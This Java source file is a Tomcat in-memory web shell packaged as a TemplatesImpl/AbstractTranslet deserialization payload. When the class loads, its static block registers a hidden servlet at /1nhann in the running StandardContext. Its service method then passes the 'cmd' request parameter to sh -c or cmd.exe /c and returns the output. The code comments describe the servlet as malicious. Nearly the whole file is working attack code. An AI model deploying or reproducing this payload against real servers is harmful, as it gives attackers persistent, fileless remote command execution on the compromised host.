import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.Serializable;

public class ServletShell extends AbstractTranslet implements Serializable,javax.servlet.Servlet {

    private static final long serialVersionUID = -5971610431559700674L;

    static {
        try {
            // 创建恶意javax.servlet.Servlet
            javax.servlet.Servlet servlet = new ServletShell();

            // 获取org.apache.catalina.core.StandardContext
            org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase =(org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            org.apache.catalina.core.StandardContext standardCtx = (org.apache.catalina.core.StandardContext)webappClassLoaderBase.getResources().getContext();

            // 用Wrapper对其进行封装
            org.apache.catalina.Wrapper newWrapper = standardCtx.createWrapper();
            newWrapper.setName("1nhann");
            newWrapper.setLoadOnStartup(1);
            newWrapper.setServlet(servlet);
            newWrapper.setServletClass(servlet.getClass().getName());

            // 添加封装后的恶意Wrapper到org.apache.catalina.core.StandardContext的children当中
            standardCtx.addChild(newWrapper);

            // 添加ServletMapping将访问的URL和javax.servlet.Servlet进行绑定
            standardCtx.addServletMappingDecoded("/1nhann","1nhann");

        }catch (Exception e){

        }
    }

    public ServletShell() throws Exception{
        namesArray = new String[]{"fuck"};
    }

    public void transform (DOM document, SerializationHandler[] handlers ) throws TransletException {}


    @Override
    public void transform (DOM document, DTMAxisIterator iterator, SerializationHandler handler ) throws TransletException {}
    @Override
    public void init(javax.servlet.ServletConfig servletConfig) throws javax.servlet.ServletException {

    }
    @Override
    public javax.servlet.ServletConfig getServletConfig() {
        return null;
    }
    @Override
    public void service(javax.servlet.ServletRequest servletRequest, javax.servlet.ServletResponse servletResponse) throws javax.servlet.ServletException, java.io.IOException {
        String cmd = servletRequest.getParameter("cmd");
        boolean isLinux = true;
        String osTyp = System.getProperty("os.name");
        if (osTyp != null && osTyp.toLowerCase().contains("win")) {
            isLinux = false;
        }
        String[] cmds = isLinux ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
        java.io.InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
        java.util.Scanner s = new java.util.Scanner(in).useDelimiter("\\a");
        String output = s.hasNext() ? s.next() : "";
        java.io.PrintWriter out = servletResponse.getWriter();
        out.println(output);
        out.flush();
        out.close();
    }
    @Override
    public String getServletInfo() {
        return null;
    }
    @Override
    public void destroy() {

    }
}
